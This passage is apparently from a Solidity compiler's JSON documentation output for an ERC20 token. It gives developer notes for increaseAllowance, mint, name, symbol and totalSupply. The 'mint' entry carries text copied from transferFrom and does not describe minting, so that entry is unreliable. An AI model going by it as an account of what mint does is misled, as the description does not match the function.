        "details": "Atomically increases the allowance granted to `spender` by the caller.     * This is an alternative to {approve} that can be used as a mitigation for problems described in {IERC20-approve}.     * Emits an {Approval} event indicating the updated allowance.     * Requirements:     * - `spender` cannot be the zero address."
      },
      "mint(address,uint256)": {
        "details": "See {IERC20-transferFrom}.     * Emits an {Approval} event indicating the updated allowance. This is not required by the EIP. See the note at the beginning of {ERC20};     * Requirements: - `sender` and `recipient` cannot be the zero address. - `sender` must have a balance of at least `amount`. - the caller must have allowance for ``sender``'s tokens of at least `amount`."
      },
      "name()": {
        "details": "Returns the name of the token."
      },
      "symbol()": {
        "details": "Returns the symbol of the token, usually a shorter version of the name."
      },
      "totalSupply()": {
        "details": "See {IERC20-totalSupply}."
      }
    }
  },
  "userdoc": {
    "methods": {}
  }
}